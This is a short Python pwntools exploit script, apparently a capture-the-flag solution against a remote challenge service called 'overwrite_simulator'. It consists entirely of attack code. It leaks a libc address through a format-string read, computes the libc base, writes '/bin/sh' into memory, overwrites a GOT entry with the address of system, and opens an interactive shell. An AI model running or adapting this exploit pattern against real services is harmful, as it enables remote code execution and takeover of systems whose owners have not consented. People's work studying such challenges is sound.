from pwn import *

def getLeak(io,addr,offset):
    io.sendline(b'1')
    io.recvuntil(':')
    io.sendline(str(addr))
    io.recvuntil(':')
    io.sendline(f"%{offset}$p")
    io.recvuntil('>>')
    io.sendline(b'2')
    return io.recvline()

def overwrite(io,address,data):
    io.sendline(b'1')
    io.recvuntil(':')
    io.sendline(str(address))
    io.recvuntil(':')
    io.sendline(data)

if __name__ == "__main__":
    hello=4210792
    #io = process('./overwrite_simulator')
    io = remote('gc1.eng.run',31112)
    libc = ELF('libc.so.6')
    system=libc.sym.system

    io.recvuntil('>>')
    libc_base = int(getLeak(io,hello,13),0) - 0x270b3
    io.recvuntil('>>')
    overwrite(io,hello,'/bin/sh\0')
    overwrite(io,0x404028,p64(system+libc_base))
    io.interactive()
